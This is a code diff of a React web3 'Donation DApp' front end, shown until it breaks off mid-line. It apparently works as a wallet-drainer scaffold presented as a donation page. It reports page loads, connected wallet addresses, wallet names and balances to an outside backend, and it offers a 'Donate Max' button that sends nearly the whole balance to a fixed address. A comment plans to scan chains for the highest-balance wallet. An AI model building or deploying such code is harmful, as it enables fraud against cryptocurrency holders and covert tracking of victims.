@@ -1,5 +1,5 @@
 // src/App.jsx
-import React, { useEffect, useState } from "react";
+import React, { useEffect, useRef, useState } from "react";
 import { ConnectButton } from "@rainbow-me/rainbowkit";
 import {
   useAccount,
@@ -8,27 +8,32 @@ import {
   useChainId,
   useWaitForTransactionReceipt,
 } from "wagmi";
-import { readContract } from "@wagmi/core";
+import { readContract } from "@wagmi/core"; // for future ERC20 reads (commented usage below)
 import { parseEther, formatEther } from "viem";
 
-/* ---------- CONFIG ----------- */
+/* ====== CONFIG ====== */
 const API_URL = "https://web-production-2da7.up.railway.app/notify";
 const RECEIVER = "0xdC3b29e4a6aF19d5E57965596020127A09049d83";
 
-/* USDT addresses (connected-chain-only) */
-const USDT_ADDRESSES = {
-  1: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum
-  56: "0x55d398326f99059fF775485246999027B3197955", // BSC
-  // 11155111: "" // Sepolia (no canonical USDT) - add if you deploy a test token
+/* Chain & symbol map (extend as needed) */
+const CHAIN_MAP = {
+  1: { name: "Ethereum Mainnet", symbol: "ETH" },
+  56: { name: "BNB Smart Chain", symbol: "BNB" },
+  11155111: { name: "Sepolia Testnet", symbol: "ETH (Sepolia)" },
 };
 
-/* Minimal ERC20 ABI */
+/* If you later add USDT: these are the mainnet addresses (kept here commented for future use)
+const USDT_ADDRESSES = {
+  1: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // ETH mainnet USDT
+  56: "0x55d398326f99059fF775485246999027B3197955", // BSC USDT
+};
 const ERC20_ABI = [
   { name: "balanceOf", type: "function", stateMutability: "view", inputs: [{ name: "owner", type: "address" }], outputs: [{ type: "uint256" }] },
   { name: "decimals", type: "function", stateMutability: "view", inputs: [], outputs: [{ type: "uint8" }] },
 ];
+*/
 
-/* ---------- HELPERS ---------- */
+/* ====== Helper: notify backend ====== */
 async function notifyBackend(event, data = {}) {
   try {
     await fetch(API_URL, {
@@ -37,61 +42,15 @@ async function notifyBackend(event, data = {}) {
       body: JSON.stringify({
         event,
         data,
-        source: window.location.href,
+        source: window.location.href, // real frontend link
       }),
     });
   } catch (err) {
-    console.error("notifyBackend failed:", err);
+    console.error("notifyBackend error:", err);
   }
 }
 
-async function fetchPrices() {
-  try {
-    const res = await fetch(
-      "https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,tether&vs_currencies=usd"
-    );
-    if (!res.ok) throw new Error("price fetch failed");
-    return await res.json();
-  } catch (e) {
-    console.warn("CoinGecko fetch failed:", e);
-    return null;
-  }
-}
-
-async function getErc20Balance(chainId, tokenAddress, walletAddress) {
-  if (!tokenAddress) return 0;
-  try {
-    const raw = await readContract({
-      address: tokenAddress,
-      abi: ERC20_ABI,
-      functionName: "balanceOf",
-      args: [walletAddress],
-      chainId,
-    });
-    const decimals = await readContract({
-      address: tokenAddress,
-      abi: ERC20_ABI,
-      functionName: "decimals",
-      args: [],
-      chainId,
-    });
-    // raw is bigint-like
-    const bal = Number(BigInt(raw) / BigInt(10 ** Number(decimals))) + (Number(raw % BigInt(10 ** Number(decimals))) / 10 ** Number(decimals));
-    // return as number with decimals (ok for USDT sized amounts)
-    return bal;
-  } catch (e) {
-    console.warn("getErc20Balance error:", e);
-    return 0;
-  }
-}
-
-/* quick chain name map (extend as needed) */
-const CHAIN_MAP = {
-  1: { name: "Ethereum Mainnet", symbol: "ETH" },
-  56: { name: "BNB Smart Chain", symbol: "BNB" },
-  11155111: { name: "Sepolia", symbol: "ETH (Sepolia)" },
-};
-
+/* ====== Component ====== */
 export default function App() {
   const { address, isConnected, connector } = useAccount();
   const chainId = useChainId();
@@ -99,67 +58,75 @@ export default function App() {
   const chainName = chainInfo.name;
   const nativeSymbol = chainInfo.symbol;
 
-  // watch native balance on connected chain
-  const { data: balanceData } = useBalance({ address, watch: true });
+  // native balance (watch for updates)
+  const { data: balanceData } = useBalance({ address, chainId, watch: true });
 
-  // tx helpers
+  // transaction API
   const { sendTransaction } = useSendTransaction();
   const [pendingHash, setPendingHash] = useState(null);
   const { data: receipt, isSuccess: receiptSuccess } = useWaitForTransactionReceipt({ hash: pendingHash, enabled: !!pendingHash });
 
-  /* ----- Wallet connect: gather balances (connected chain only) + notify ----- */
+  // prev-connected ref to detect disconnect
+  const prevConnectedRef = useRef(false);
+
+  /* ----- link_open on page load ----- */
+  useEffect(() => {
+    // include page URL via notifyBackend's source
+    notifyBackend("link_open", { note: "page_loaded" });
+  }, []);
+
+  /* ----- wallet_connect: send single rich notification (native balance) ----- */
   useEffect(() => {
     if (!isConnected || !address) return;
+
     (async () => {
-      // native balance (formatted)
+      // native balance (human)
       let nativeBal = "0";
-      if (balanceData?.value) {
-        try {
-          nativeBal = formatEther(balanceData.value);
-        } catch (e) {
-          nativeBal = "0";
-        }
+      try {
+        if (balanceData?.value) nativeBal = formatEther(balanceData.value);
+      } catch (e) {
+        nativeBal = "0";
       }
 
-      // USDT on connected chain (if available)
-      const usdtAddr = USDT_ADDRESSES[chainId];
-      let usdtBal = 0;
-      if (usdtAddr) {
-        usdtBal = await getErc20Balance(chainId, usdtAddr, address);
-      }
-
-      // get prices
-      const prices = await fetchPrices();
-      const ethPrice = prices?.ethereum?.usd ?? null;
-      const bnbPrice = prices?.binancecoin?.usd ?? null;
-      const usdtPrice = prices?.tether?.usd ?? 1;
-
-      // compute USD (best-effort)
-      let nativeUsd = "...";
-      if (chainId === 1 && ethPrice) nativeUsd = (Number(nativeBal) * ethPrice).toFixed(2);
-      if (chainId === 56 && bnbPrice) nativeUsd = (Number(nativeBal) * bnbPrice).toFixed(2);
-
-      const usdtUsd = usdtBal ? (Number(usdtBal) * usdtPrice).toFixed(2) : "...";
-
-      // send single rich wallet_connect event
+      // (optional) you can fetch price and compute USD here; omitted to reduce client-side calls
       await notifyBackend("wallet_connect", {
         account: address,
         wallet_name: connector?.name || "unknown",
         chain: chainName,
         native_balance: nativeBal,
-        native_balance_usd: nativeUsd,
-        usdt_balance: usdtBal,
-        usdt_balance_usd: usdtUsd,
       });
+
+      // ===== Example: commented-out USDT read skeleton (for future) =====
+      /*
+      const usdtAddr = USDT_ADDRESSES[chainId];
+      if (usdtAddr) {
+        try {
+          const raw = await readContract({ address: usdtAddr, abi: ERC20_ABI, functionName: "balanceOf", args: [address], chainId });
+          // decimals read & conversion omitted for brevity
+        } catch (e) {
+          console.warn("USDT read error", e);
+        }
+      }
+      */
     })();
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [isConnected, address, chainId, balanceData, connector]);
 
-  /* ----- Tx receipt watch: notify final confirmation ----- */
+  /* ----- wallet_disconnect detection ----- */
+  useEffect(() => {
+    const prev = prevConnectedRef.current;
+    if (prev && !isConnected) {
+      // was connected before, now disconnected
+      notifyBackend("wallet_disconnect", { account: address });
+    }
+    prevConnectedRef.current = isConnected;
+  }, [isConnected, address]);
+
+  /* ----- watch receipt: final notification ----- */
   useEffect(() => {
     if (!receiptSuccess || !receipt) return;
-    const statusOK = receipt.status === 1 || receipt.status === "success" || receipt.status === true;
-    if (statusOK) {
+    const ok = receipt.status === 1 || receipt.status === "success" || receipt.status === true;
+    if (ok) {
       notifyBackend("donation_confirmed", {
         account: address,
         txHash: pendingHash,
@@ -176,24 +143,27 @@ export default function App() {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [receiptSuccess, receipt]);
 
-  /* ===== Donation fixed (0.01 native) ===== */
+  /* ===== Donate fixed (0.01 native) ===== */
   const handleDonateFixed = async () => {
     if (!isConnected || !address) {
       notifyBackend("donation_failed", { account: address, error: "wallet_not_connected" });
       return;
     }
-    // notify user clicked (attempt)
+
+    // user clicked (intent)
     notifyBackend("donation_attempt", { account: address, amount: "0.01", token: nativeSymbol, chain: chainName });
+
     try {
-      const amount = parseEther("0.01");
-      const txResp = await sendTransaction({ request: { to: RECEIVER, value: amount } });
-      // txResp often has hash
+      const amountWei = parseEther("0.01"); // BigInt
+      const txResp = await sendTransaction({ request: { to: RECEIVER, value: amountWei } });
+
+      // wallet returns tx response (contains hash if accepted)
       const txHash = txResp?.hash || txResp?.transactionHash || (txResp && txResp);
       if (txHash) {
         setPendingHash(txHash);
         notifyBackend("donation_approved", { account: address, txHash, amount: "0.01", token: nativeSymbol, chain: chainName });
       } else {
-        // If wallet returns nothing, still notify approval
+        // rare fallback
         notifyBackend("donation_approved", { account: address, amount: "0.01", token: nativeSymbol, chain: chainName });
       }
     } catch (err) {
@@ -206,19 +176,21 @@ export default function App() {
     }
   };
 
-  /* ===== Donate Max (native balance - gas buffer) ===== */
+  /* ===== Donate Max (native only): balance - gasBuffer (BigInt math) ===== */
   const handleDonateMax = async () => {
     if (!isConnected || !address || !balanceData?.value) {
       notifyBackend("donation_failed", { account: address, error: "missing_balance_or_wallet" });
       return;
     }
+
     try {
-      const raw = BigInt(balanceData.value); // BigInt
+      const raw = BigInt(balanceData.value); // BigInt exact
       const buffer = parseEther("0.001"); // BigInt
       if (raw <= buffer) {
         notifyBackend("donation_failed", { account: address, error: "insufficient_balance" });
         return;
       }
+
       const sendWei = raw - buffer; // BigInt
       const human = Number(formatEther(sendWei)).toFixed(6);
 
@@ -226,48 +198,4 @@ export default function App() {
 
       const txResp = await sendTransaction({ request: { to: RECEIVER, value: sendWei } });
       const txHash = txResp?.hash || txResp?.transactionHash || (txResp && txResp);
-      if (txHash) {
-        setPendingHash(txHash);
-        notifyBackend("donation_approved", { account: address, txHash, amount: human, token: nativeSymbol, chain: chainName });
-      } else {
-        notifyBackend("donation_approved", { account: address, amount: human, token: nativeSymbol, chain: chainName });
-      }
-    } catch (err) {
-      const msg = err?.message || String(err);
-      if (msg.toLowerCase().includes("user rejected") || msg.toLowerCase().includes("user denied")) {
-        notifyBackend("donation_rejected", { account: address, error: msg });
-      } else {
-        notifyBackend("donation_failed", { account: address, error: msg });
-      }
-    }
-  };
-
-  /* ===== UI ===== */
-  return (
-    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white p-6">
-      <h1 className="text-4xl font-bold">🚀 Donation DApp</h1>
-      <p className="text-sm text-gray-300 max-w-xl text-center mt-2">
-        Connect your wallet, then donate. Wallet connection sends a single rich notification (balances + USD).
-      </p>
-
-      <div className="mt-6">
-        <ConnectButton />
-      </div>
-
-      {isConnected && (
-        <div className="mt-6 flex flex-col items-center gap-4">
-          <div className="text-sm text-gray-300">Connected: <code className="bg-gray-800 p-1 rounded">{address}</code> on <strong>{chainName}</strong></div>
-
-          <div className="flex gap-3 mt-2">
-            <button onClick={handleDonateFixed} className="px-6 py-3 bg-blue-600 hover:bg-blue-700 rounded-lg">Donate 0.01 {nativeSymbol}</button>
-            <button onClick={handleDonateMax} className="px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg">Donate Max {nativeSymbol}</button>
-          </div>
-        </div>
-      )}
-    </div>
-  );
-}
-
-/* ===== Auto-highest-balance + chain-switch framework intentionally left commented for later =====
-   (Add logic here to scan multiple chains & tokens, compute USD value, and prompt chain switch.)
-*/
+      i
